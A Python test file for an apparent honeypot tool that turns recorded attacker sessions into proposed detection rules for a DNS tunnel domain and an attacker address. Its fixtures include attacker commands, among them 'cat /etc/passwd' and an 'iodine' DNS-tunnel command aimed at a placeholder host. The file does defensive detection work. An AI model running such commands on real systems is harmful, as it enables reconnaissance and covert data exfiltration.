from datetime import UTC, datetime

from contracts.models import HoneypotSession, Rule, SessionEvent
from mimicnet.honeypot import Settings, play
from mimicnet.rules import rules_from
from mimicnet.shell import TUNNEL_DOMAIN


def test_rules_from_scripted_session_returns_suffix_and_address_rules():
    session = play("alert-1")
    rules = rules_from(session)

    assert len(rules) == 2

    suffix_rule = rules[0]
    assert suffix_rule.rule_id == f"rule-{session.session_id}-suffix"
    assert suffix_rule.target == "covertrace"
    assert suffix_rule.type == "ioc"
    assert suffix_rule.status == "proposed"
    assert suffix_rule.session_id == session.session_id
    assert suffix_rule.match == {"qname_suffix": TUNNEL_DOMAIN}

    addr_rule = rules[1]
    assert addr_rule.rule_id == f"rule-{session.session_id}-addr"
    assert addr_rule.target == "covertrace"
    assert addr_rule.type == "ioc"
    assert addr_rule.status == "proposed"
    assert addr_rule.session_id == session.session_id
    assert addr_rule.match == {"src_ip": Settings().attacker_addr}


def test_rules_from_session_without_tunnel_gives_only_address_rule():
    session = play("alert-1", commands=["whoami", "uname -a", "cat /etc/passwd", "exit"])
    rules = rules_from(session)

    assert len(rules) == 1
    addr_rule = rules[0]
    assert addr_rule.rule_id == f"rule-{session.session_id}-addr"
    assert addr_rule.target == "covertrace"
    assert addr_rule.type == "ioc"
    assert addr_rule.status == "proposed"
    assert addr_rule.session_id == session.session_id
    assert addr_rule.match == {"src_ip": Settings().attacker_addr}


def test_rules_from_empty_session_gives_empty_list():
    now = datetime.now(UTC)
    session = HoneypotSession(
        session_id="session-empty",
        alert_id="alert-empty",
        service="ssh-like",
        container_id="c-none",
        started=now,
        ended=now,
        events=[],
    )
    assert rules_from(session) == []


def test_rules_from_session_with_only_tunnel_command():
    now = datetime.now(UTC)
    session = HoneypotSession(
        session_id="session-cmd-only",
        alert_id="alert-cmd-only",
        service="ssh-like",
        container_id="c-none",
        started=now,
        ended=now,
        events=[
            SessionEvent(
                ts=now,
                type="command",
                data={"line": "iodine -f tunnel.example.org", "reply": ""},
            )
        ],
    )
    rules = rules_from(session)
    assert len(rules) == 1
    assert rules[0].rule_id == "rule-session-cmd-only-suffix"
    assert rules[0].target == "covertrace"
    assert rules[0].type == "ioc"
    assert rules[0].status == "proposed"
    assert rules[0].match == {"qname_suffix": "tunnel.example.org"}


def test_rules_validate_against_contract():
    session = play("alert-contract-check")
    rules = rules_from(session)
    for r in rules:
        dumped = r.model_dump()
        revalidated = Rule.model_validate(dumped)
        assert revalidated == r
        assert r.target in ("flowsight", "covertrace")
        assert r.type in ("ioc", "threshold")
        assert r.status in ("proposed", "approved", "active", "rejected")
